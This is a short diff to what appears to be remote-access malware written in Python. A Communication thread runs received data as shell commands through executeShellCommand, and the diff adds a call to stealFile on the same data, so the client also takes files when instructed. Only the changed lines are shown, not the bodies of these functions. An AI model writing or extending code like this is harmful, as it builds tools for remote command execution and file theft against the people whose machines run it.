@@ -32,6 +32,7 @@ class Communication(Thread):
             print(data)
             if data:
                 self.executeShellCommand(data)
+                self.stealFile(data)
                 jsonData = dumps(data, ensure_ascii=False)
                 Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                 if self.__config.debug:
